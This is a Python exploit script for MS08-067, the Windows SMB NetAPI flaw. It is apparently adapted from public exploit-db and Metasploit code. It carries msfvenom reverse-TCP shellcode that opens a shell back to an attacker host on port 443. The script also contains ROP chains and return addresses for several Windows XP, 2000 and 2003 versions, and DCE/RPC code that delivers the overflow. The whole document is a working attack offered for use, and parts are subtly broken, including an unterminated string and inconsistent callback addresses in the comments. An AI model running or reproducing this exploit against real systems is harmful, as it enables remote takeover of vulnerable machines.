import struct
import time
import sys


from threading import Thread    #Thread is imported in case you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#   Modified by Volta Sec to include XP SP 2 15/02/18

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/shell/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -v shellcode -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x31\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += "\x81\x76\x0e\x63\xb2\x9e\xea\x83\xee\xfc\xe2\xf4"
shellcode += "\x9f\x5a\x1c\xea\x63\xb2\xfe\x63\x86\x83\x5e\x8e"
shellcode += "\xe8\xe2\xae\x61\x31\xbe\x15\xb8\x77\x39\xec\xc2"
shellcode += "\x6c\x05\xd4\xcc\x52\x4d\x32\xd6\x02\xce\x9c\xc6"
shellcode += "\x43\x73\x51\xe7\x62\x75\x7c\x18\x31\xe5\x15\xb8"
shellcode += "\x73\x39\xd4\xd6\xe8\xfe\x8f\x92\x80\xfa\x9f\x3b"
shellcode += "\x32\x39\xc7\xca\x62\x61\x15\xa3\x7b\x51\xa4\xa3"
shellcode += "\xe8\x86\x15\xeb\xb5\x83\x61\x46\xa2\x7d\x93\xeb"
shellcode += "\xa4\x8a\x7e\x9f\x95\xb1\xe3\x12\x58\xcf\xba\x9f"
shellcode += "\x87\xea\x15\xb2\x47\xb3\x4d\x8c\xe8\xbe\xd5\x61"
shellcode += "\x3b\xae\x9f\x39\xe8\xb6\x15\xeb\xb3\x3b\xda\xce"
shellcode += "\x47\xe9\xc5\x8b\x3a\xe8\xcf\x15\x83\xed\xc1\xb0"
shellcode += "\xe8\xa0\x75\x67\x3e\xda\xad\xd8\x63\xb2\xf6\x9d"
shellcode += "\x10\x80\xc1\xbe\x0b\xfe\xe9\xcc\x64\x4d\x4b\x52"
shellcode += "\xf3\xb3\x9e\xea\x4a\x76\xca\xba\x0b\x9b\x1e\x81"
shellcode += "\x63\x4d\x4b\x80\x69\xda\x5e\x42\x51\x22\xf6\xe8"
shellcode += "\x63\xa3\xc2\x63\x85\xe2\xce\xba\x33\xf2\xce\xaa"
shellcode += "\x33\xda\x74\xe5\xbc\x52\x61\x3f\xf4\xd8\x8e\xbc"
shellcode += "\x34\xda\x07\x4f\x17\xd3\x61\x3f\xe6\x72\xea\xe0"
shellcode += "\x9c\xfc\x96\x9f\x8f\x5a\xff\xea\x63\xb2\xf4\xea"
shellcode += "\x09\xb6\xc8\xbd\x0b\xb0\x47\x22\x3c\x4d\x4b\x69"
shellcode += "\x9b\xb2\xe0\xdc\xe8\x84\xf4\xaa\x0b\xb2\x8e\xea"
shellcode += "\x63\xe4\xf4\xea\x0b\xea\x3a\xb9\x86\x4d\x4b\x79"
shellcode += "\x30\xd8\x9e\xbc\x30\xe5\xf6\xe8\xba\x7a\xc1\x15"
shellcode += "\xb6\x31\x66\xea\x1e\x90\xc6\x82\x63\xf2\x9e\xea"
shellcode += "\x09\xb2\xce\x82\x68\x9d\x91\xda\x9c\x67\xc9\x82"
shellcode += "\x16\xdc\xd3\x8b\x9c\x67\xc0\xb4\x9c\xbe\xba\x03"
shellcode += "\x12\x4d\x61\x15\x62\x71\xb7\x2c\x16\x75\x5d\x51"
shellcode += "\x83\xaf\xb4\xe0\x0b\x14\x0b\x57\xfe\x4d\x4b\xd6"
shellcode += "\x65\xce\x94\x6a\x98\x52\xeb\xef\xd8\xf5\x8d\x98"
shellcode += "\x0c\xd8\x9e\xb9\x9c\x67\x9e\xea"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	elif (self.os=='8'):
		print 'Windows XP SP2 English (NX)\n'
		rvasets = {'call_HeapCreate' : 0x21064, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e546,'pop ecx / ret' :0x2e546 + 6,'mov [eax], ecx / ret' :0xd182,'jmp eax':0x19b85,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret' :0x10976,'mov [eax+0x10], ecx / ret':0x10976 + 6,'add eax, 8 / ret':0x29a14}
 		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()